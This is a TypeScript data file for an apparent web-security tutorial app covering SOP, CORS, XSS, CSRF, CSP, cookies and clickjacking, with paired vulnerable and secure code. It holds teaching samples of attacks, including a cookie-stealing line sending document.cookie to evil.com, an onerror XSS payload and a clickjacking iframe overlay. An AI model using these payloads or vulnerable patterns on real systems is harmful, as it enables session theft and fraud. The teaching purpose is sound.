export interface DetailedSection {
  title: string;
  content?: string;
  code?: string;
  subItems?: { label: string; description: string }[];
}

export interface SecurityTopic {
  id: string;
  name: string;
  category: 'Foundations' | 'Injection' | 'Authentication' | 'Browser Defense' | 'Architecture';
  estimatedTime: string;
  summary: string;
  content: {
    definition: string;
    attackVector?: string;
    defenseStrategy?: string;
    detailedSections: DetailedSection[];
    codeExample?: {
      vulnerable?: string;
      secure?: string;
      explanation?: string;
    };
    visualizationType: 'sop' | 'cors' | 'xss' | 'csrf' | 'csp' | 'cookies' | 'clickjacking' | 'defense-stack';
  };
}

export const securityTopics: SecurityTopic[] = [
  {
    id: 'same-origin-policy',
    name: 'Same-Origin Policy (SOP)',
    category: 'Foundations',
    estimatedTime: '15 min',
    summary: 'The bedrock security boundary of the web: how browsers isolate untrusted origins.',
    content: {
      definition: 'The Same-Origin Policy (SOP) is a critical browser security mechanism that restricts how a document or script loaded from one origin can interact with resources from another origin. It prevents malicious sites from reading confidential data from banking or social portals you are logged into.',
      attackVector: 'Without SOP, any website could run `fetch("https://your-bank.com/account/balance")` in the background, and the browser would automatically include your session cookies, allowing third-party sites to steal sensitive data.',
      defenseStrategy: 'SOP is enforced automatically by the user agent. Developers must structure cross-origin resource sharing deliberately via CORS and keep sensitive cookies scoped appropriately.',
      detailedSections: [
        {
          title: 'The Origin Tuple: Protocol + Host + Port',
          content: 'Two URLs share the same origin if and only if their protocol, host (domain), and port match exactly.',
          subItems: [
            { label: 'http://example.com:80 vs https://example.com:80', description: 'Different origin (protocol mismatch: http vs https).' },
            { label: 'https://example.com vs https://api.example.com', description: 'Different origin (host mismatch: subdomain api).' },
            { label: 'https://example.com:443 vs https://example.com:8443', description: 'Different origin (port mismatch: 443 vs 8443).' },
            { label: 'https://example.com/user vs https://example.com/login', description: 'Same origin (paths do not affect the origin).' }
          ]
        },
        {
          title: 'What SOP Allows vs What SOP Blocks',
          content: 'SOP permits cross-origin writes (sending requests, submitting forms, linking) and embedding (images, scripts, styles), but strictly restricts cross-origin reads (reading response body, inspecting DOM of iframes, accessing cross-origin localStorage).'
        }
      ],
      codeExample: {
        vulnerable: `// On attacker.com
fetch('https://target-bank.com/api/user/transactions')
  .then(res => res.json())
  .then(data => exfiltrateToEvil(data)); // BLOCKED by SOP: read permission denied`,
        secure: `// Server explicitly declares cross-origin read policy
// If public, server responds with CORS header:
Access-Control-Allow-Origin: https://trusted-partner.com
// Otherwise, the browser forbids attacker.com from reading the response.`,
        explanation: 'Browsers enforce origin isolation on reading data. While the network request may succeed on the wire, the response body is kept inaccessible from client script unless CORS permits it.'
      },
      visualizationType: 'sop'
    }
  },
  {
    id: 'cors-architecture',
    name: 'Cross-Origin Resource Sharing (CORS)',
    category: 'Foundations',
    estimatedTime: '20 min',
    summary: 'Master simple requests, preflight OPTIONS handshakes, and credential hazards.',
    content: {
      definition: 'CORS is a W3C standard protocol that relaxes the Same-Origin Policy in a controlled way, allowing servers to declare which cross-origin applications are permitted to read their private API responses.',
      attackVector: 'A common misconfiguration is reflecting arbitrary `Origin` headers into `Access-Control-Allow-Origin` while setting `Access-Control-Allow-Credentials: true`, completely bypassing SOP for authenticated sessions.',
      defenseStrategy: 'Strictly validate the request `Origin` header against an allowlist of trusted origins before echoing it. Never combine `Access-Control-Allow-Origin: *` with credentials.',
      detailedSections: [
        {
          title: 'Simple vs Preflighted Requests',
          content: 'Requests using GET, POST, or HEAD with standard headers (Accept, Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain) are Simple Requests. If a request uses PUT, DELETE, custom headers (like Authorization), or Content-Type: application/json, the browser MUST first dispatch an OPTIONS preflight request.'
        },
        {
          title: 'Critical CORS Response Headers',
          subItems: [
            { label: 'Access-Control-Allow-Origin', description: 'Specifies which origin(s) can read the response (e.g. https://app.example.com).' },
            { label: 'Access-Control-Allow-Methods', description: 'Comma-separated list of permitted HTTP methods for preflighted requests.' },
            { label: 'Access-Control-Allow-Headers', description: 'Headers that the client is permitted to send in the actual request.' },
            { label: 'Access-Control-Allow-Credentials', description: 'Must be explicitly "true" for browsers to expose responses when cookies/Authorization are sent.' },
            { label: 'Access-Control-Max-Age', description: 'Seconds the browser is allowed to cache preflight responses, eliminating redundant OPTIONS calls.' }
          ]
        }
      ],
      codeExample: {
        vulnerable: `// Express.js Vulnerability: Blind Origin Reflection with Credentials
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Credentials', 'true'); // Critical flaw: any malicious site can steal user data!
  next();
});`,
        secure: `// Secure CORS Configuration with Strict Allowlist
const ALLOWED_ORIGINS = new Set(['https://app.example.com', 'https://admin.example.com']);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Max-Age', '86400');
  }
  next();
});`,
        explanation: 'Always maintain an immutable Set of authorized origins. Never use regex without anchoring (^ and $) or reflect arbitrary Origin headers when credentials are enabled.'
      },
      visualizationType: 'cors'
    }
  },
  {
    id: 'xss-cross-site-scripting',
    name: 'Cross-Site Scripting (XSS) & Sanitization',
    category: 'Injection',
    estimatedTime: '25 min',
    summary: 'Taxonomy of Reflected, Stored, and DOM XSS, and context-aware escaping.',
    content: {
      definition: 'Cross-Site Scripting (XSS) occurs when an application receives untrusted data and includes it in a web page without proper validation, context-aware encoding, or sanitization, allowing an attacker to execute arbitrary JavaScript in the victim\'s browser.',
      attackVector: 'Once arbitrary JavaScript executes in a victim\'s browser, the attacker can hijack session cookies (unless HttpOnly), capture keystrokes, make authenticated API calls on the user\'s behalf, or redirect to credential harvesters.',
      defenseStrategy: 'Context-aware output encoding (HTML body, attributes, JavaScript context), HTML sanitization with DOMPurify, Content Security Policy (CSP), and avoiding unsafe sinks like innerHTML or dangerouslySetInnerHTML.',
      detailedSections: [
        {
          title: 'The Three Primary XSS Classes',
          subItems: [
            { label: 'Stored (Persistent) XSS', description: 'Malicious payload is permanently saved in the database (e.g. comment forum, user profile) and delivered to all users who view the content.' },
            { label: 'Reflected (Non-Persistent) XSS', description: 'Payload is delivered via URL parameters or form submissions and reflected immediately by the server in the response page.' },
            { label: 'DOM-based XSS', description: 'Attack payload never leaves the browser. Client-side script reads from an untrusted source (location.hash, searchParams) and writes directly into a dangerous sink (innerHTML, eval).' }
          ]
        },
        {
          title: 'Dangerous Sinks to Avoid in Modern Web Apps',
          content: 'Avoid `element.innerHTML`, `document.write()`, `window.eval()`, `new Function()`, `setTimeout(string)`, and React `dangerouslySetInnerHTML`. Always prefer `element.textContent` or pre-compile templates.'
        }
      ],
      codeExample: {
        vulnerable: `// Vulnerable DOM XSS in client router
const params = new URLSearchParams(window.location.search);
const userName = params.get('name'); // Source: untrusted query string

// Dangerous Sink: unescaped innerHTML
document.getElementById('welcome').innerHTML = "Welcome back, " + userName;
// Attacker URL: ?name=<img src=x onerror=alert(document.cookie)>`,
        secure: `// Secure implementation using safe DOM API and DOMPurify
import DOMPurify from 'dompurify';

const params = new URLSearchParams(window.location.search);
const userName = params.get('name') || 'Guest';

// Option A: Safe textContent (prevents all HTML parsing)
document.getElementById('welcome').textContent = "Welcome back, " + userName;

// Option B: If rich HTML is strictly necessary, sanitize thoroughly
const cleanHTML = DOMPurify.sanitize(userProvidedBio, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});
document.getElementById('bio').innerHTML = cleanHTML;`,
        explanation: 'textContent treats all input strictly as text characters, rendering <script> as literal inert characters. When HTML is required, DOMPurify strips unsafe tags, attributes, and pseudo-protocols like javascript:.'
      },
      visualizationType: 'xss'
    }
  },
  {
    id: 'csrf-and-samesite',
    name: 'Cross-Site Request Forgery (CSRF)',
    category: 'Authentication',
    estimatedTime: '20 min',
    summary: 'Ambient browser credentials, SameSite cookie defense, and synchronizer tokens.',
    content: {
      definition: 'CSRF forces an authenticated user to execute unwanted actions on a web application in which they are currently logged in. Because browsers automatically attach cookies with cross-site requests, a malicious site can trigger unauthorized financial transactions, email changes, or state mutations.',
      attackVector: 'An attacker hosts `evil.com` containing `<form action="https://bank.com/transfer" method="POST">`. When the victim visits `evil.com`, a script auto-submits the form. The browser includes `bank.com` session cookies, and the bank processes the fraudulent transfer.',
      defenseStrategy: 'Enforce modern `SameSite=Lax` or `SameSite=Strict` cookie policies. Pair with cryptographically random Anti-CSRF Synchronizer Tokens or Custom Request Headers (`X-Requested-With`, `Authorization: Bearer`).',
      detailedSections: [
        {
          title: 'The SameSite Cookie Revolution',
          subItems: [
            { label: 'SameSite=Strict', description: 'Cookie is NEVER sent in cross-site requests, even when following a link from an external site.' },
            { label: 'SameSite=Lax (Modern Default)', description: 'Cookie is withheld on cross-site subrequests (images, iframes, POST forms), but sent on top-level safe GET navigations.' },
            { label: 'SameSite=None; Secure', description: 'Cookie is sent across all cross-site contexts, but strictly requires HTTPS.' }
          ]
        },
        {
          title: 'Anti-CSRF Synchronizer Token Pattern',
          content: 'The server generates a unique, cryptographically random, unpredictable token per session. On form submission or state-changing API calls, the client must submit this token in a header or hidden field. An attacker on evil.com cannot read this token due to SOP.'
        }
      ],
      codeExample: {
        vulnerable: `// Vulnerable endpoint relying solely on cookies
app.post('/api/account/email', (req, res) => {
  const userId = req.session.userId; // Authenticated via session cookie
  updateEmail(userId, req.body.email); // CSRF Vulnerable: anyone can trigger this!
  res.json({ success: true });
});`,
        secure: `// Defense 1: Set SameSite=Lax on Session Cookie
res.cookie('sessionId', sid, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 86400000
});

// Defense 2: Validate Anti-CSRF Token or Custom Header
app.post('/api/account/email', csrfProtection, (req, res) => {
  // Middleware verifies req.headers['x-csrf-token'] matches session token
  const userId = req.session.userId;
  updateEmail(userId, req.body.email);
  res.json({ success: true });
});`,
        explanation: 'SameSite=Lax prevents evil.com from attaching the cookie on POST requests. The CSRF token provides defense-in-depth, ensuring cross-site attackers cannot forge the payload.'
      },
      visualizationType: 'csrf'
    }
  },
  {
    id: 'content-security-policy',
    name: 'Content Security Policy (CSP)',
    category: 'Browser Defense',
    estimatedTime: '25 min',
    summary: 'Master directive hierarchies, cryptographic nonces, hashes, and reporting.',
    content: {
      definition: 'Content Security Policy (CSP) is an HTTP response header that restricts the resources (scripts, styles, images, iframes, fonts) that the browser is allowed to load and execute for a given page, providing a powerful secondary defense against XSS and data exfiltration.',
      attackVector: 'Even if an attacker finds an XSS injection flaw, a strict CSP will prevent the browser from executing inline `<script>` tags, block `eval()`, and prohibit `fetch()` calls to unauthorized attacker domains.',
      defenseStrategy: 'Deploy a strict nonce-based or hash-based CSP. Start with `Content-Security-Policy-Report-Only` to detect breaking changes before switching to enforcement mode.',
      detailedSections: [
        {
          title: 'Core CSP Directives Hierarchy',
          subItems: [
            { label: 'default-src', description: 'Fallback policy for all fetch directives if not explicitly specified.' },
            { label: 'script-src', description: 'Defines valid sources for JavaScript. Use nonces (\'nonce-RANDOM\') or hashes instead of \'unsafe-inline\'.' },
            { label: 'connect-src', description: 'Restricts targets for fetch(), XMLHttpRequest, WebSocket, and EventSource.' },
            { label: 'img-src & font-src', description: 'Controls origins from which images and web fonts can be retrieved.' },
            { label: 'frame-ancestors', description: 'Replaces X-Frame-Options to restrict which sites can embed your page in an iframe.' }
          ]
        },
        {
          title: 'The Danger of unsafe-inline and unsafe-eval',
          content: 'Including `unsafe-inline` or `unsafe-eval` neuters CSP against XSS attacks. Modern best practice utilizes per-request cryptographically secure random nonces (`nonce-abc123xyz`) generated on the server.'
        }
      ],
      codeExample: {
        vulnerable: `// Ineffective / Overly Permissive CSP Header
Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval';
// Defeats the purpose of CSP: any injected script or eval() will execute freely!`,
        secure: `// Production-Grade Strict Nonce-Based CSP
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-rAnd0m123==' 'strict-dynamic';
  style-src 'self' 'nonce-rAnd0m123==';
  img-src 'self' data: https://images.unsplash.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  report-uri /api/csp-violations;`,
        explanation: 'The server generates a unique cryptographic nonce per HTTP request. Only script tags containing matching nonce="rAnd0m123==" can run. Injected attacker scripts lack the nonce and are blocked.'
      },
      visualizationType: 'csp'
    }
  },
  {
    id: 'cookie-security-architecture',
    name: 'Cookie Security Architecture',
    category: 'Authentication',
    estimatedTime: '20 min',
    summary: 'HttpOnly, Secure, SameSite, Domain scoping, and Prefix standards.',
    content: {
      definition: 'HTTP Cookies are the foundation of web session persistence. Securing cookies with proper flags and prefix standards prevents token exfiltration via XSS, man-in-the-middle interception, and cross-site injection.',
      attackVector: 'A session cookie without `HttpOnly` can be stolen with `new Image().src = "evil.com?c=" + document.cookie`. Without `Secure`, credentials transmit in plaintext across open Wi-Fi networks.',
      defenseStrategy: 'Always configure `HttpOnly; Secure; SameSite=Lax`. Utilize modern cookie prefixes `__Host-` and `__Secure-` to lock down domain and path spoofing.',
      detailedSections: [
        {
          title: 'The Essential Security Flags',
          subItems: [
            { label: 'HttpOnly', description: 'Prevents client-side scripts from reading document.cookie, mitigating credential theft via XSS.' },
            { label: 'Secure', description: 'Ensures the cookie is only transmitted over encrypted HTTPS connections, preventing network sniffing.' },
            { label: 'SameSite=Lax / Strict', description: 'Restricts cross-site transmission to mitigate CSRF attacks.' },
            { label: 'Path=/ & Domain Scoping', description: 'Omitting the Domain attribute restricts the cookie strictly to the host, preventing subdomain leakage.' }
          ]
        },
        {
          title: 'The __Host- and __Secure- Cookie Prefixes',
          content: 'Modern browsers enforce rules for special cookie names. Cookies starting with `__Host-` MUST have `Secure`, `Path=/`, and NO `Domain` attribute, preventing any compromised subdomain from overwriting parent cookies.'
        }
      ],
      codeExample: {
        vulnerable: `// Insecure Cookie Configuration
Set-Cookie: sessionId=xyz123; Path=/;
// Insecure: readable via document.cookie, transmitted over plaintext HTTP!`,
        secure: `// Robust Cookie Configuration with __Host- Prefix
Set-Cookie: __Host-sessionId=xyz123; 
  Path=/; 
  Secure; 
  HttpOnly; 
  SameSite=Lax; 
  Max-Age=86400;`,
        explanation: '__Host- prefix guarantees the cookie is encrypted over HTTPS, inaccessible to JavaScript, restricted to the exact domain (no subdomains), and scoped to the root path.'
      },
      visualizationType: 'cookies'
    }
  },
  {
    id: 'clickjacking-defense',
    name: 'Clickjacking & UI Redressing',
    category: 'Browser Defense',
    estimatedTime: '15 min',
    summary: 'Framing vulnerabilities, X-Frame-Options, and CSP frame-ancestors.',
    content: {
      definition: 'Clickjacking (UI Redressing) is an attack where an attacker embeds a legitimate target website inside an invisible `<iframe>` layered beneath a deceptive decoy button, tricking the user into clicking unintended actions.',
      attackVector: 'An attacker creates a "Claim Free Prize" game on `evil.com`, but overlays an invisible `opacity: 0` iframe pointing to `target.com/delete-account` exactly under the user\'s mouse cursor.',
      defenseStrategy: 'Disallow unauthorized framing using `Content-Security-Policy: frame-ancestors` and legacy `X-Frame-Options`.',
      detailedSections: [
        {
          title: 'Frame Protection Standards',
          subItems: [
            { label: 'X-Frame-Options: DENY', description: 'Completely prevents any page (even same origin) from framing this document.' },
            { label: 'X-Frame-Options: SAMEORIGIN', description: 'Permits framing only if the framing page shares the exact same origin.' },
            { label: 'CSP: frame-ancestors \'none\'', description: 'Modern W3C replacement for DENY with broader browser and multiple-parent support.' },
            { label: 'CSP: frame-ancestors \'self\' https://trusted.com', description: 'Allows framing only by specific, verified partner applications.' }
          ]
        }
      ],
      codeExample: {
        vulnerable: `<!-- Evil site framing target without frame protection -->
<div style="position: relative;">
  <button>Click to win $1000!</button>
  <iframe 
    src="https://bank.com/transfer-funds" 
    style="opacity: 0.0001; position: absolute; top: 0; left: 0; z-index: 99;">
  </iframe>
</div>`,
        secure: `// Server response header blocking all framing
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';`,
        explanation: 'When the browser receives frame-ancestors none, it refuses to render the iframe and displays a framing violation error in the console.'
      },
      visualizationType: 'clickjacking'
    }
  },
  {
    id: 'modern-web-defense-stack',
    name: 'Defense-in-Depth Web Security Stack',
    category: 'Architecture',
    estimatedTime: '20 min',
    summary: 'Layered security: Helmet headers, Subresource Integrity (SRI), and Trusted Types.',
    content: {
      definition: 'Security in depth acknowledges that any single layer can fail. A resilient web architecture combines server-side input validation, strict browser security headers, client-side cryptographic hashing, and runtime isolation.',
      attackVector: 'Relying solely on one defense (e.g. only HTML escaping) fails when developers introduce template engines, direct DOM manipulation, or third-party CDN compromises.',
      defenseStrategy: 'Apply the complete security header suite: Strict-Transport-Security (HSTS), X-Content-Type-Options, Referrer-Policy, Permissions-Policy, and Subresource Integrity (SRI) for external scripts.',
      detailedSections: [
        {
          title: 'The Essential Security Headers Suite',
          subItems: [
            { label: 'Strict-Transport-Security (HSTS)', description: 'Forces browsers to communicate exclusively over HTTPS for max-age seconds (includeSubDomains; preload).' },
            { label: 'X-Content-Type-Options: nosniff', description: 'Prevents the browser from MIME-sniffing a response away from the declared Content-Type.' },
            { label: 'Referrer-Policy: strict-origin-when-cross-origin', description: 'Protects user privacy by stripping sensitive URL path/query parameters on cross-origin requests.' },
            { label: 'Permissions-Policy', description: 'Disables unused browser hardware APIs like geolocation, camera, and microphone.' }
          ]
        },
        {
          title: 'Subresource Integrity (SRI)',
          content: 'When loading third-party scripts from CDNs, specify cryptographic hashes (`integrity="sha384-..."`). If the CDN is compromised and the script is altered, the browser aborts execution.'
        }
      ],
      codeExample: {
        vulnerable: `<!-- Vulnerable third-party script include without integrity check -->
<script src="https://cdn.example.com/analytics.js"></script>
<!-- If cdn.example.com is hacked, attacker injects malicious keylogger into your users! -->`,
        secure: `<!-- Secure Subresource Integrity (SRI) include -->
<script 
  src="https://cdn.example.com/analytics.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>`,
        explanation: 'The browser computes the SHA-384 hash of the downloaded script. If it does not match the integrity attribute bit-for-bit, execution is blocked immediately.'
      },
      visualizationType: 'defense-stack'
    }
  }
];
